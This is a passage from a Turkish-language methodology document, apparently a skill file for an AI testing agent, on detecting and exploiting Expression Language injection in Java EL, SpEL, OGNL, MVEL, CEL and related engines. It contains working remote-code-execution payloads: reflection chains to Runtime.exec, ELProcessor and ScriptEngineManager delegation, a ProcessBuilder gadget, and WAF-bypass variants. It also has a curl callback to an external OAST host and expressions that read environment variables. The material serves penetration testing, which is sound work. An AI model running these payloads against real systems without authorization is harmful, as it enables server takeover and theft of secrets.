reflect_call(reflect_call(java.lang.Class, "forName", "java.lang.Runtime"),
  "exec", "curl http://8f3a2b1c.oast.fun/aviator")
```

Bir DNS-only kanal doğrulaması da (HTTP çalışmasa bile) geçerli bir
OOB confirmation'dır — yalnızca bir hostname resolve edilebiliyorsa
yeterlidir:
```
${T(java.net.InetAddress).getByName("8f3a2b1c.oast.fun")}
```

**Yaşam döngüsü kuralı — KRİTİK (SSTI skill'indeki birebir aynı
kural):** `interactsh-client`'ı **testin en başında** başlat ve **log
tutarak** çalışır durumda bırak. Agent, o hedefteki **tüm** EL
Injection adaylarını tamamen test edip bitirene kadar
interactsh-client'ı **kapatma** — OOB ping'leri (özellikle stored/
indirect senaryolarda, bir kural motorunun bir sonraki tetiklenme
döngüsünde) saatler sonra bile gelebilir.

```
1. interactsh-client başlat + logla   (test oturumunun en başında)
2. Tüm EL Injection adaylarını sırayla test et (§4 ana akış)
3. Her OOB payload'ı gönderdiğinde bunu bir "bekleyen OOB" listesine ekle
4. Tüm adaylar test edildikten sonra bile, interactsh log dosyasını
   bir süre daha izlemeye devam et
5. Ancak TÜM bekleyen OOB'lar için makul bir bekleme süresi geçtikten
   ve rapor yazımına geçildikten sonra interactsh-client'ı kapat
```

**"Makul bekleme süresi" için somut varsayılan (guideline, katı kural
değil — hedefin davranışı farklıysa uyarlanır):**
```text
immediate (senkron HTTP response bekleniyor)     → 30-60 saniye
async worker/queue (arka planda işleniyor)        → 5-15 dakika
scheduled/cron iş akışı (belirli aralıkla çalışır) → uygulamaya özgü,
                                                      recon'da tespit
                                                      edilen zamanlamaya
                                                      göre ayarlanır
uzun-ömürlü kampanya (wildcard/çok günlük tarama)  → kampanya kapanışına
                                                      kadar (bkz. FAZ 4)
```

**Callback-payload eşleştirme (correlation) — birden fazla aday aynı
collaborator domain'ini kullandığında karışıklığı önlemek için:**
Her gönderilen OOB payload'ı için "bekleyen OOB" listesine şu alanlar
kaydedilir (yalnızca tek bir `oob_domain` tutup hangi payload'dan
geldiğini sonradan tahmin etmeye çalışmak yerine):

```text
oob_token           benzersiz alt-domain/tanımlayıcı (interactsh-client
                     her istekte farklı bir subdomain üretir — bunu
                     kullan, sabit bir domain kullanma)
oob_candidate        hangi endpoint/parametre/konum adayı
oob_payload          gönderilen tam payload
oob_protocol         beklenen callback türü (dns/http/smtp/ldap)
oob_sent_timestamp   gönderim zamanı
oob_callback_received  evet/hayır + gelen callback'in zamanı
oob_correlation_confidence
                     yüksek (token birebir eşleşti) / düşük (yalnızca
                     domain eşleşti, birden fazla aday aynı anda
                     bekliyordu — hangi payload'dan geldiği kesin değil)
```

Bu yüzden pratik kural: mümkünse her aday için **ayrı bir benzersiz
subdomain/token** üretilmeli (interactsh-client'ın doğası gereği zaten
her istek farklı bir alt-domain döndürür) — asla aynı sabit domain'i
birden fazla adaya kopyala-yapıştır yapılmamalı, aksi halde bir
callback geldiğinde hangi adayın tetiklediği belirsizleşir ve
`oob_correlation_confidence=düşük` olarak işaretlenmesi gerekir (bu
durumda bulgu `confirmed` değil `probable` kalır).

**Callback almak, EL'in gerçekten evaluate edildiğinin KANITI DEĞİLDİR
— execution causality ayrıca değerlendirilmelidir:** Bir OOB callback'i
almak, tek başına "expression evaluate edildi" anlamına gelmez, çünkü
başka mekanizmalar da bir URL'e istek attırabilir:
```text
- DNS prefetch (tarayıcı/proxy, sayfadaki bir URL'i önceden çözebilir)
- Kurumsal/güvenlik proxy'si (URL'leri otomatik "ziyaret ederek"
  tarayan bir gateway/AV)
- Link preview mekanizması (Slack/Teams/e-posta istemcisi gibi
  araçlar, paylaşılan bir URL'in önizlemesini oluşturmak için ona
  istek atabilir — payload response'ta bir yere kaydedilip
  başka bir sistem tarafından "önizlenirse" bu olur)
- URL validator/link-checker (bazı uygulamalar, kaydedilen bir
  URL'in geçerliliğini arka planda otomatik kontrol eder)
- Outbound content filter (bazı güvenlik ürünleri giden trafiği
  otomatik taramak için URL'leri "ziyaret eder")
```
Bu yüzden bir OOB callback'i, aşağıdaki ek bağlam olmadan tek başına
`confirmed` seviyesine çıkarılmamalıdır:
```text
1. Payload-özel correlation: token birebir eşleşti (yukarıdaki
   oob_correlation_confidence=yüksek)
2. Delivery/execution context tutarlılığı: callback'in geldiği ZAMAN,
   payload'ın GERÇEKTEN EL context'inde evaluate edilmesi beklenen
   bir olayla (ör. bir cron job'ın çalışma zamanı, bir worker'ın
   kuyruğu işleme sıklığı) tutarlı mı? Payload gönderilir gönderilmez
   (saniyeler içinde) gelen bir callback, DNS-prefetch/link-preview
   şüphesini artırır (bunlar genelde çok hızlıdır); beklenen worker/
   cron zamanlamasıyla eşleşen bir callback, gerçek evaluation
   ihtimalini güçlendirir.
3. Payload'ın kendisi yalnızca bir URL DEĞİL, bir expression içeriyorsa
   (ör. `T(java.net.URL).new(...).openConnection()` gibi, salt-metin
   bir link değil, yalnızca EL evaluate edilirse anlamlı olan bir
   kod parçası), bu link-preview/DNS-prefetch ihtimalini büyük
   ölçüde eler — çünkü önizleme/prefetch mekanizmaları yalnızca DÜZ
   METİN URL'leri takip eder, bir expression'ı evaluate edip
   içindeki URL'i inşa etmez.
```

### 9.4 Motor Bazlı Blind/OOB Kapasite Hızlı Referansı

| Motor | Timing primitive | Network primitive (OOB) | Not |
|---|---|---|---|
| SpEL | Döngü/rekürsif SpEL çağrısıyla üretilebilir | `T(java.lang.Runtime)`/`T(java.net.InetAddress)` ile var | Sandbox'sız `StandardEvaluationContext` kullanılıyorsa kolay; `SimpleEvaluationContext` kullanılıyorsa `T(...)` kapalı olabilir (§12.3) |
| OGNL | `@java.lang.Thread@sleep(N)` ile üretilebilir | `@java.lang.Runtime@` zinciriyle var | Struts2'de `#_memberAccess` kısıtlaması varsa bypass gerekebilir (§12.2) |
| Java EL/UEL | Sınırlı — döngü primitive'i EL'in kendisinde zayıftır, çoğunlukla reflection zinciri üzerinden dolaylı | `ELProcessor` ile `Runtime`'a erişim varsa var | JSF `#{...}` context'inde genelde erişilebilir helper kümesi uygulamaya bağlıdır (§12.1) |
| MVEL | `while`/`for` desteği var, üretilebilir | `new java.net.Socket(...)`/`ProcessBuilder` ile var | Sandbox yok, genelde kolay (§12.4) |
| JEXL | Sınırlı native döngü, `Class.forName` zinciriyle mümkün | `Class.forName` ile Runtime/Socket erişimi varsa var | `JexlSandbox` yapılandırılmışsa kısıtlı olabilir (§12.5) |
| CEL | **Yok** — CEL'in tasarımı sonlandırma garantisi verir (loop/recursion yasak) | Genelde **yok** — yalnızca kayıtlı custom function network-capable ise var | Negatif sonuç burada **beklenen** davranıştır (§12.6) |
| FEEL | **Yok** — CEL'e benzer, sonlandırma garantili tasarım | Genelde **yok** | Negatif sonuç burada **beklenen** davranıştır, FEEL bunun için elenmez (§12.7) |
| DRL | Var (Java tabanlı, `then` bloğu üzerinden) | Java reflection zinciriyle var | `then` bloğunda hangi dialect'in (MVEL/Java) aktif olduğu önce doğrulanmalı; bu genelde saf EL Injection'dan geniş bir `RULE_ENGINE_CODE_INJECTION`'dır (§12.4, §14.2) |
| Aviator/QLExpress | Döngü desteği sürüme göre değişir | Reflection açıksa var | Alibaba ekosistem ürünlerinde genelde ek bir sandbox/whitelist katmanı bulunur (§12.8) |

**Kullanım kuralı:** SSTI skill'indeki aynı ilke — bu tablo bir
başlangıç hipotezidir, hedefe özel bir helper/custom fonksiyon varsa
gerçek durum farklı olabilir.

---

## 10. Confirmation, Impact Assessment, Confidence Scoring

### 10.1 Dört Ayrı Katman (Birbirine Karıştırılmamalı)

1. **Detection** → evaluation oluyor mu? (§5)
2. **Fingerprinting** → hangi motor? (§7)
3. **Confirmation** → Eksen 1'deki (causality) kanıt geçerli bir
   negatif kontrolle birlikte sağlandı mı (§5.1/§10.2)? Bu, **detection
   ile aynı teknik** olabilir — confirmation, detection'dan ayrı/
   bağımsız bir evidence **kategorisi** gerektirmez; gerektirdiği şey
   detection'daki kanıtın §5.1'deki negatif kontrol şartını
   karşılamasıdır. (Stored/indirect veya OOB gibi **ek** kanıt türleri
   varsa bunlar confidence'ı güçlendirir ama zorunlu değildir — bkz.
   §10.2 "tek başına yeterlidir".)
4. **Impact Assessment** → zafiyetin yetki dahilinde gerçek etkisi.

### 10.2 Confirmation Önceliği

Önce sistemde **kalıcı değişiklik yapmayan** (side-effect-free)
yöntemler denenir. **Ama dikkat:** side-effect-free ≠ risksiz/zararsız
— `${systemProperties}`, `${T(java.lang.System).getenv()}` gibi
çıktılar hedefe göre gerçekten hassas bilgi (secret key, credential,
internal hostname) sızdırabilir.

**Differential confirmation:** §5.1'deki tekniği kullan. Bu, §8.4'e
göre **Eksen 1 (causality) için tek başına "confirmed" EL Injection'a
yeterlidir** — engine attribution'ın (Eksen 2) ayrıca confirmed olması
şart değildir.

### 10.3 Gerçekten Gerekli Olan Sınırlar

§0.2 ile birebir aynı: dosya/veri silme/değiştirme yok, kalıcı
sistem değişikliği yok, reverse shell/kalıcı C2 yok, kasıtlı ağır DoS
yok, scope dışına sıçrama yok. Bunların dışında kalan her şey
(`id`, `whoami`, `curl`, `wget`, hassas veri erişiminin gösterilmesi)
serbesttir.

### 10.4 Impact Assessment Üç Ekseni

1. Sandbox/kısıtlama var mı / aşıldı mı (örn. `SimpleEvaluationContext`
   mi `StandardEvaluationContext` mi, CEL'in tasarım gereği sandbox'ı
   mı aşıldı — bu genelde imkansızdır ve ayrı raporlanmalıdır).
2. Yalnızca bilgi sızıntısı mı, yoksa RCE'ye kadar gidiliyor mu.
3. Etkilenen veri/sistemin hassasiyeti (tek kullanıcı verisi /
   ayrıcalıklı-admin verisi / sunucu genelinde / — kural motoru
   bağlamında: iş mantığının kendisinin manipüle edilebilir olması,
   örn. bir onay kuralının atlatılması, ayrı ve önemli bir impact
   boyutudur).

### 10.5 Confidence Scoring — ÖRNEK/ÖNERİ MODEL

SSTI skill'indeki ikili eksen modeli birebir korunur:

```
EL Injection classification = Eksen 1 kuralı (§8.4)   ← belirleyici
Engine classification        = Eksen 2 kuralı (§8.4)   ← AYRI, bağımsız
confidence_score              = aşağıdaki puanlama       ← yalnızca öncelik/raporlama
```

**Eksen 1 — EL Injection (causality) puanlama:**

| Kanıt | Örnek puan |
|---|---|
| Reflection-correlation evidence | +1 |
| Evaluation evidence (geçerli negatif kontrol dahil) | +5 |
| Stored/indirect execution evidence | +5 |
| OOB evidence | +6 |

- **≥5** → confirmed. **1–4** → probable. **0** → negative.

**Eksen 2 — Engine (attribution) puanlama, tamamen ayrı:**

| Kanıt | Örnek puan |
|---|---|
| Weak indicator | +1 |
| Medium indicator | +2 |
| Strong indicator (genelde error signature) | +4 |

- **≥4** → confirmed. **1–3** → probable. **0** → unknown.

### 10.6 Ne Zaman Durulmalı

- Skor "confirmed" eşiğine ulaştığında gereksiz ek detection/
  confirmation payload'ı denenmez.
- Aday başına belirlenen request bütçesi tükendiğinde → "inconclusive"
  işaretle, sıradaki adaya geç. **Bu bütçeler bir guideline'dır, katı
  bir üst sınır (hard cap) değildir** — aşağıdaki `~5` gibi değerler
  "genelde bu kadar yeterli olur" anlamındadır; hedef net biçimde
  ilerleme kaydediyorsa (ör. her istekte yeni bir sinyal/kanıt
  toplanıyor, motor daralıyor) bütçe aşılsa bile devam edilir. Tersine,
  bazı adaylar 2 request'te confirmed olabilirken bazıları 20 request
  sonunda hâlâ inconclusive kalabilir — amaç "N'de dur" değil, "N
  civarında ilerleme yoksa muhtemelen bu yönde daha fazla gitmenin
  faydası az" sinyalidir. Tek bir düz sayı yerine (ör. "15
  request") aşama bazlı bir bütçe daha isabetlidir, çünkü basit bir
  adayın (ör. tek motor hemen fingerprint edildi) P6'ya kadar 15
  request'e ihtiyacı olmayabilirken, çok motorlu/belirsiz bir adayda
  15 request context+fingerprint aşamasını bile bitirmeyebilir:
  ```text
  generic_detection_budget   ~5 request  (P0-P2: reflection/syntax/evaluation)
  context_budget             ~3 request  (P3: payload doğru context'e oturdu mu)
  fingerprint_budget         ~5 request  (P4: motor/object-discovery daraltma)
  bypass_budget               ~5 request  (yalnızca WAF/filter tespit edildiyse)
  confirmation_budget         ~5 request  (P5-P6: capability/impact, second-order/OOB)
  ```
  Bu alt-bütçeler birbirinden bağımsız tükenir — ör. fingerprint
  aşaması bütçesini bitirip motor belirlenemezse, o aday
  "inconclusive: fingerprint_exhausted" olarak işaretlenip bir
  sonraki adaya geçilir; bypass_budget yalnızca gerçek bir
  filter/WAF sinyali varsa devreye girer (§8.2 gate'i).
- WAF/rate-limit block'u art arda 3+ kez tetiklenirse → backoff uygula
  veya bypass denemesine geç (§8.2).

  **Etiketleme notu (bypass'ı engellemez, yalnızca raporlama
  doğruluğunu artırır):** `403` yanıtının kök nedeni WAF'la sınırlı
  değildir — authentication, CSRF token eksikliği, rate-limit,
  business-logic validasyonu veya bot-koruması da aynı status code'u
  üretebilir. Bypass encoding'lerini denemek (yukarıdaki backoff/geç
  kuralı) her durumda zararsızdır ve engellenmez; ancak nihai raporda
  bulguyu "WAF bypass edildi" diye etiketlemeden önce, mümkünse
  destekleyici bir sinyal aranmalıdır (WAF'a özgü response header/body
  imzası, ya da payload'ın İÇERİĞİNDEN bağımsız olarak — yani zararsız
  bir istekte de aynı 403'ün alınıp alınmadığı kontrol edilerek —
  gerçekten içerik-bazlı bir filtrelemenin var olduğu doğrulanması).
  Bu ayrım yapılmazsa bir CSRF/auth kaynaklı 403, yanlışlıkla "WAF
  bypass" bulgusu olarak raporlanabilir.

### 10.7 Paralel/Sıralı Çalışma

- Farklı endpoint'lerdeki generic probe'lar paralel yürütülebilir.
- Aynı endpoint içindeki fingerprinting adımları **sıralı** olmalı.

---

## 11. Modern Mimari Notları

- **Microservice/API-first mimari:** EL Injection'ın bulunduğu servis
  ile evaluation'ın gerçekleştiği servis farklı olabilir (örn. bir
  API Gateway policy'si bir servisten gelen değeri CEL ile evaluate
  ediyor) — zincir haritalamayı servisler arası takip ederek yap.
- **Queue/worker sistemleri:** Kural motoru (Drools/Camunda)
  tabanlı sistemlerde evaluation genelde asenkron bir worker/job
  içinde gerçekleşir → doğrudan Blind EL Injection metodolojisiyle
  (§9) örtüşür.
- **Kubernetes / Service Mesh (CEL bağlamı — önemli ve giderek
  yaygınlaşan bir attack surface):** Kubernetes'in
  `ValidatingAdmissionPolicy`/`MutatingAdmissionPolicy` kaynakları ve
  Common Expression Language (CEL) tabanlı diğer bileşenler (OPA
  Gatekeeper'ın bazı entegrasyonları, Envoy RBAC filtreleri, Istio
  `AuthorizationPolicy`), kullanıcı tarafından (veya bir CI/CD
  pipeline'ı aracılığıyla dolaylı olarak) sağlanan manifest/policy
  tanımlarını CEL ile evaluate eder. Buradaki risk klasik "RCE"
  değildir (CEL sandbox'lıdır, bkz. §12.6) — asıl risk **policy
  bypass'ıdır**: saldırgan, admission policy'nin gerçekte
  doğrulamadığı bir CEL ifadesi yazarak (örn. her zaman `true` dönen
  bir koşul, ya da bir tip coercion/karşılaştırma hatasından
  yararlanarak) güvenlik kontrolünü atlatabilir. **Sınıflandırma
  notu:** Bu tür bir bulgu klasik EL Injection'dan çok bir
  **authorization/policy logic bypass**'tır — raporlarken bu ayrımı
  netleştir, ama kullanılan mekanizma (CEL ifadesi enjeksiyonu/
  manipülasyonu) yine bu skill'in kapsamındadır.
- **GraphQL API'ler:** EL Injection'ın kendisi için ayrı bir motor/
  teknik gerektirmez — GraphQL burada yalnızca bir **taşıma
  katmanıdır** (delivery mechanism), sink genelde bir resolver'ın
  arkasındaki filter/sort/rule mantığıdır (§4 Sink Discovery aynen
  uygulanır). Introspection açıksa, `filter`/`sort`/`condition` gibi
  alan adlarının hangi mutation/query'lere karşılık geldiğini
  keşfetmek için kullanılabilir (bkz. SSTI skill §11'deki aynı
  teknik — burada §2'nin risk skorlama listesiyle eşleştirilerek
  uygulanır). GraphQL hata modeli SSTI skill'inde belirtildiği gibi
  genelde HTTP 200 + `errors[].message` şeklindedir; EL error
  signature'ları (§7) öncelikle bu alana bakılarak aranmalıdır.
- **No-code/low-code iş akışı ve BRMS (Business Rule Management
  System) platformları:** Camunda, Activiti, Flowable gibi BPMN/DMN
  motorları, ve kurumsal BRMS ürünleri (Drools tabanlı ticari
  platformlar dahil) kullanıcı tanımlı koşul/kural ifadelerini FEEL
  veya DRL ile evaluate eder. Bu, EL Injection'ın **en doğrudan ve en
  "birinci sınıf vatandaş" olduğu** modern attack surface'lerden
  biridir — çünkü bu platformlarda "kullanıcının kendi ifadesini
  yazması" zaten **tasarım gereği beklenen bir özelliktir** (SSTI'deki
  gibi "gizli/beklenmeyen" bir sink değil, dokümante edilmiş bir
  giriş noktasıdır). Asıl soru genelde "bu ifade alanı gerçekten
  yetkilendirilmiş kullanıcılara mı açık, yoksa düşük ayrıcalıklı bir
  kullanıcı/anonim bir form gönderimi de bu alana ulaşabiliyor mu"
  sorusudur — klasik EL Injection + yetki sınırı aşımı kombinasyonu
  olarak değerlendirilmeli.
- **Spring Cloud / mikroservis konfigürasyon merkezi (Config Server,
  Cloud Gateway):** Spring Cloud Gateway route tanımları ve Spring
  Cloud Function routing mekanizmaları, bazı sürüm/konfigürasyonlarda
  route/header/routing-expression değerlerini SpEL ile evaluate eder.
  Bu değerler bir config repository'sinden (Git-backed Config Server)
  veya doğrudan bir HTTP header'ından (örn. bir "spring.cloud.function.
  routing-expression" benzeri mekanizma) geliyorsa, uzaktan
  tetiklenebilir bir EL Injection yüzeyi oluşur — spesifik sürüm/
  advisory kimliği kasıtlı olarak verilmemiştir (bkz. §15), davranış
  hedefte ampirik olarak doğrulanmalıdır.
- **WebSocket / persistent connection'lar:** Bir mesaj üzerinden
  tetiklenen EL Injection (örn. bir gerçek-zamanlı kural motoru
  entegrasyonu), genelde tek bir request-response modeliyle değil
  bağlantı boyunca yayılan bir mesaj akışıyla çalışır — Blind EL
  Injection metodolojisiyle (§9) örtüşür.
- **Message broker / event-driven mimari (Kafka, RabbitMQ):** Bazı
  stream-processing/routing katmanları (örn. bir mesaj yönlendirme
  kuralı) mesaj header'larından veya body'sinden gelen değerleri bir
  routing/filter ifadesine besler — bu da klasik stored/indirect
  zincire (§9.1) çok yakın bir mimari örüntüdür: payload bir mesaj
  olarak yayınlanır, evaluation başka bir consumer/worker'da
  gerçekleşir.
- **JSONPath — komşu ama bu skill'in kapsamı DIŞINDA bir attack
  surface:** Modern API gateway'ler, validation katmanları ve bazı
  Kubernetes CRD'leri, veri sorgulama/filtreleme için JSONPath
  kullanır. JSONPath, CEL gibi bir "policy/query dili"dir ama CEL
  DEĞİLDİR — ayrı bir sözdizimi ve ayrı bir implementasyon
  ekosistemine sahiptir, bu yüzden bu skill'in motor profillerine
  (§12) dahil edilmemiştir. Ancak agent, bir API'nin filtre/sorgu
  parametresinde `$..` veya `[?(...)]` gibi JSONPath sözdizimi
  gördüğünde, bunun CEL'den farklı bir dil olduğunu tanımalı ve bu
  skill'in CEL testlerini (§12.6) doğrudan JSONPath'e uygulamamalıdır
  — karışıklık, yanlış motor attribution'ına (bkz. §7) yol açar.

---

## 12. Motor Profilleri ve Payload Kütüphanesi

> Her profil şu yapıyla organize edilmiştir: Technology fingerprint,
> Syntax/Delimiter, Generic detection, Confirmation/RCE payload'ları,
> Sandbox davranışı, Version/Configuration notları, Known
> vulnerabilities. Confirmation payload çıktıları **otomatik "safe"
> değildir** — hedefe göre hassas bilgi/erişim sağlayabilir (bkz. §10.2).
> Tüm aritmetik örnekler `6666*6666 → 44435556` kuralına göre
> yazılmıştır (bkz. §5).

### 12.1 Java EL / UEL (Unified Expression Language) — JSF, JSP, Java EE

> Ekosistem: Apache Tomcat/Jasper, GlassFish, WildFly/JBoss,
> WebLogic, WebSphere, IBM Liberty; framework'ler: JSF (Mojarra/
> Apache MyFaces referans implementasyonları), PrimeFaces, RichFaces,
> ICEfaces, OpenFaces, Apache MyFaces Tobago.

- **Technology fingerprint:** `.jsf`/`.xhtml` uzantılı sayfalar,
  `javax.faces.ViewState`/`jakarta.faces.ViewState` gizli form alanı
  (Jakarta EE 9+ isim alanı geçişine dikkat), `JSESSIONID` cookie'si,
  `faces-config.xml` referansları, response header'larında
  `X-Powered-By: JSF/...`.
- **Delimiter:** `${ }` (deferred olmayan/immediate değerlendirme,
  JSP EL'in orijinal sözdizimi), `#{ }` (deferred/lazy değerlendirme,
  JSF component binding'lerinde standart), nadiren `*{ }` (bazı
  Thymeleaf/JSF karma entegrasyonlarında selection expression). **Ek
  context — tamamen delimiter'sız (sarmalayıcısız) doğrudan API
  besleme:** Uygulama girdiyi `${...}`/`#{...}` içine hiç gömmeden
  **doğrudan** `ExpressionParser.parseExpression(user_input)` benzeri
  bir API'ye besliyorsa (örn. bir "formül alanı"/"hesaplama motoru"
  özelliği), motor **hiçbir sarmalayıcıya** (ne `$`/`#` işaretine ne
  de ekstra bir `{ }` çiftine) ihtiyaç duymadan girdiyi doğrudan
  ifade olarak evaluate eder — örn. yalnızca `6666*6666` (herhangi
  bir işaret/parantez OLMADAN) doğrudan `44435556` sonucunu üretir.
  **Düzeltme notu:** Bu context'i `{6666*6666}` gibi süslü parantez
  içine sarılmış bir "delimiter varyantı" olarak düşünmek yanlıştır
  — süslü parantez Java EL/UEL sözdiziminin bir parçası değildir;
  "delimiter'sız" context'in anlamı tam olarak **hiçbir işaretin
  gerekmediğidir**. §6 Context Detection prosedüründe bu variant,
  yalnızca çıplak `6666*6666` (parantezsiz) ile denenmelidir.
- **Generic detection:**
  ```
  ${6666*6666}
  ${44444444-8888}
  #{6666*6666}
  #{44444444-8888}
  6666*6666
  ${'AAA_'.concat('44435556')}
  ```
  Son satır (`6666*6666`, hiçbir sarmalayıcı olmadan) yalnızca yukarıda
  tanımlanan doğrudan-parser-API context'inde denenir — normal
  `${...}`/`#{...}` sink'lerinde bu çıplak hal genelde bir literal
  string olarak yansır, evaluate edilmez; bu context farkı §6'da
  ayrıca doğrulanmalıdır.
  `${...}` çalışmıyor ama `#{...}` çalışıyorsa (veya tam tersi) —
  bu **elemez**, yalnızca hangi evaluation modunun (immediate/deferred)
  o context'te aktif olduğunu gösterir.
- **String-mutation ile detection (aritmetik filtreleniyorsa alternatif
  probe):** Bazı hedeflerde yalnızca aritmetik operatörler (`*`, `-`)
  filtrelenmiş olabilir ama String metotlarına erişim açık kalabilir.
  Bu durumda canary'yi bir string transform metoduyla doğrula:
  ```
  AAA_${'zkz'.replace('k','x')}_ZZZ  → beklenen: AAA_zxz_ZZZ
  ```
  Beklenen dönüşüm (`k`→`x`) response'ta görülüyorsa, aritmetik
  negatif dönse bile bu **evaluation evidence** sayılır (§5) —
  motor çalışıyor, yalnızca aritmetik context-specific olarak
  kısıtlanmış olabilir.
- **`getClass()` blacklist bypass — array-index property access
  (WAF bypass — bkz. §8.2.1 B15):** Bazı filtreler yalnızca
  `.getClass()` string'ini arar. Java EL/UEL'de bir property'ye
  hem `.property` hem `["property"]` (map/array-style) sözdizimiyle
  erişilebilir — bu ikisi motor için eşdeğerdir ama filtre için
  farklı görünebilir:
  ```
  ${''["class"]}                          # ${''.getClass()} ile eşdeğer
  ${''["class"].forName("java.util.Date")}
  ```
- **Error signatures (Strong indicator):** `javax.el.ELException`,
  `javax.el.PropertyNotFoundException`, `javax.el.MethodNotFoundException`,
  `jakarta.el.ELException` (Jakarta EE 9+), `com.sun.faces.context`,
  `org.apache.myfaces`.
- **Bilgi toplama (JSP/JSTL implicit object'leri — hepsi standart EL
  scope'larıdır, uygulamaya özel değildir):**
  ```
  ${applicationScope}                     # global uygulama değişkenleri
  ${requestScope}                         # request kapsamlı değişkenler
  ${sessionScope}                         # session kapsamlı değişkenler
  ${initParam}                            # uygulama başlatma parametreleri
  ${param.X}                              # X adlı bir HTTP parametresinin değeri
  ${paramValues.X}                        # X parametresinin tüm değerleri (array)
  ${pageContext.request.remoteAddr}
  ${facesContext.externalContext.request.getSession().getId()}
  ```
  Bu implicit object'leri `.toString()` ile zorlamak gerekebilir
  (örn. `${sessionScope.toString()}`), çünkü çıplak halleri bazı
  response context'lerinde görünür bir string temsiline
  dönüşmeyebilir.
- **Java EL 3.0+'a özgü sözdizimi (Servlet 3.0+/EE 7+ ortamlar,
  detection ve capability-discovery için ek sinyaller):**
  ```
  ${(x->x+1)(5)}              (lambda expression — EL 3.0'a özgü,
                                çalışıyorsa Strong indicator, motor
                                en az EL 3.0 seviyesinde)
  ${empty param.name}          (empty operatörü — null/boş kontrolü;
                                canary hiç yansımadığında bile bu
                                operatörün evaluate edilip
                                edilmediğini test ederek evaluation
                                kanıtı toplamanın düşük-riskli bir yolu)
  ${fn:trim(' test ')}         (JSTL fonksiyonu — yalnızca JSP/JSTL
                                taglib import edilmiş context'lerde
                                geçerlidir, `xmlns:fn` tanımlı olmalı;
                                çalışması JSTL'in aktif olduğunu
                                gösterir ama tek başına motor
                                fingerprint'i değildir)
  ```
- **JSF `<f:viewParam>` — özel bir attack surface (§12.1'e özgü,
  diğer Java EL context'lerinde bulunmaz):** JSF sayfalarında
  `<f:viewParam name="x" value="#{bean.x}">` bildirimi, URL query
  string'inden gelen `x` parametresini otomatik olarak EL context'ine
  bağlar. Bazı yanlış yapılandırmalarda (özellikle `value` attribute'u
  dinamik/kullanıcı-etkili bir expression'dan türetiliyorsa, veya
  view'ın kendisi bir template motoru tarafından kullanıcı girdisiyle
  oluşturuluyorsa) bu bağlama zinciri, parametre değerinin `#{param.name}`
  yerine doğrudan `#{name}` gibi bir expression'a dönüşmesine yol
  açabilir — yani URL parametresinin kendisi (değeri değil, akışın
  bir yerinde ismi/yapısı) EL ifadesine karışabilir. Bu vektör, normal
  form input alanlarından farklı olarak **URL/view-parametre binding**
  aşamasında oluştuğu için ayrı test edilmelidir: JSF sayfalarında
  keşfedilen her `<f:viewParam>` kullanan view, o parametrenin adını
  ve değerini ayrı ayrı EL syntax'ıyla denemeyi gerektirir.
- **RCE / confirmation — `ELProcessor` üzerinden (Java EL 3.0+,
  Servlet 3.0+ ortamlarında `javax.el.ELProcessor`/
  `jakarta.el.ELProcessor` doğrudan erişilebilirse):**
  ```
  ${''.getClass().forName('javax.el.ELProcessor').getDeclaredConstructor().newInstance()
     .eval('Runtime.getRuntime().exec(\"id\")')}
  ```
  **Not:** Bare `Runtime` (tam nitelenmiş `java.lang.Runtime` değil)
  kullanılabilir çünkü EL 3.0 spesifikasyonuna göre `ELProcessor`'ın
  `ImportHandler`'ı **varsayılan olarak `java.lang` paketini otomatik
  import eder** — bu yüzden ayrıca bir `importClass`/`importPackage`
  çağrısına gerek yoktur. Negatif dönerse (bazı implementasyonlar bu
  varsayılanı override etmiş olabilir), aşağıdaki tam nitelenmiş
  (`java.lang.Runtime`) forma geçilmelidir — o her koşulda geçerlidir.
- **RCE / confirmation — doğrudan reflection zinciri (`ELProcessor`
  erişilemiyorsa, geniş uyumluluğa sahip bir reflection alternatifi
  — ama bu da context/implementasyon kısıtlarından muaf değildir,
  bkz. §7 fingerprinting sonucu hangi motor/kısıtlama profiliyle
  uğraşıldığını gösterir):**
  ```
  ${''.getClass().forName('java.lang.Runtime')
     .getMethod('exec', ''.getClass())
     .invoke(''.getClass().forName('java.lang.Runtime')
       .getMethod('getRuntime').invoke(null), 'id')}
  ```
- **RCE / confirmation — method-index reflection (WAF bypass —
  bkz. §8.2.1 B16, `getMethod('exec', ...)` gibi literal metot adı
  string'lerini arayan filtreleri atlatmak için):** `getMethod(name,
  ...)` yerine `getMethods()` ile tüm metot dizisini alıp **indeksle**
  erişmek, filtrenin aradığı `"exec"`/`"getRuntime"` gibi literal
  string'leri payload'dan tamamen çıkarır:
  ```
  ${''.getClass().forName('java.lang.Runtime').getMethods()[6]}
  # → public static java.lang.Runtime java.lang.Runtime.getRuntime()
  # (indeks JVM/sürüme göre değişebilir — önce P4 object-discovery
  #  aşamasında doğru indeksi keşfet, sonra RCE payload'ında kullan)
  ${''.getClass().forName('java.lang.Runtime').getMethods()[6]
     .invoke(''.getClass().forName('java.lang.Runtime')).exec('id')}
  ```
  **Kritik uyarı:** Metot indeksi JVM sürümüne, JDK dağıtımına ve
  derleme sırasına göre **değişkendir** — production'da kör
  kullanılmadan önce mutlaka aynı ortamda (mümkünse P4 aşamasında,
  `getMethods()[N].toString()` çıktısını okuyarak) doğrulanmalıdır.
- **RCE / confirmation — `ArrayList` + `ProcessBuilder` gadget
  (Runtime.exec doğrudan filtreleniyorsa, komut argümanlarını adım
  adım bir listeye ekleyip ProcessBuilder'a besleyen alternatif
  zincir — Windows örneği, Linux'a `/bin/sh`/`-c` ile uyarlanabilir):**
  ```
  ${request.setAttribute("c","".getClass().forName("java.util.ArrayList").getDeclaredConstructor().newInstance())}
  ${request.getAttribute("c").add("cmd.exe")}
  ${request.getAttribute("c").add("/c")}
  ${request.getAttribute("c").add("whoami")}
  ${request.setAttribute("a","".getClass()
     .forName("java.lang.ProcessBuilder")
     .getDeclaredConstructors()[0]
     .newInstance(request.getAttribute("c")).start())}
  ${request.getAttribute("a")}
  ```
- **RCE / confirmation — `ScriptEngineManager` üzerinden (JavaScript
  engine'e devretme, `Runtime`/`ProcessBuilder` literal'leri tamamen
  filtreleniyorsa bir alternatif — `javax.script` API'sinin kendisi
  standart JRE'nin bir parçasıdır, **ama bu bir JS engine'in mevcut
  olduğu anlamına GELMEZ**, bkz. aşağıdaki JDK sürüm notu):**
  ```
  ${''.getClass().forName('javax.script.ScriptEngineManager')
     .getDeclaredConstructor().newInstance().getEngineByName('js')
     .eval('java.lang.Runtime.getRuntime().exec(\"id\")')}
  ```
  **Not (JDK sürüm bağımlılığı — `getDeclaredConstructor()` düzeltmesinden
  TAMAMEN AYRI bir konu):** Nashorn (`js`/`nashorn` motor adı),
